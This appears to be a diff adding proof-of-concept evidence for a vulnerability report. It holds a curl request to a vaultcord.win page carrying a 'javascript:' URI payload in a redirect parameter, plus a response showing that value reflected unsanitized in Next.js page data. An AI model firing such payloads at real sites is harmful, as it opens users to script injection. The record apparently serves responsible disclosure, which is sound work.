@@ -1,0 +1,10 @@
+# Request (required UA)
+curl -sS -A "Mozilla/5.0 ResponsibleReporter Gecko/20100101" -H "Accept: text/html" -H "Referer: https://vaultcord.com/" -H "Origin: https://vaultcord.com" "https://vaultcord.win/hi?wait=1&to=javascript:window.__pwned=1"
+
+# Response status line
+HTTP/2 200 
+
+# pageProps reflection (from __NEXT_DATA__)
+wait = "1"
+to   = "javascript:window.__pwned=1"
+SSR waiting room present = True
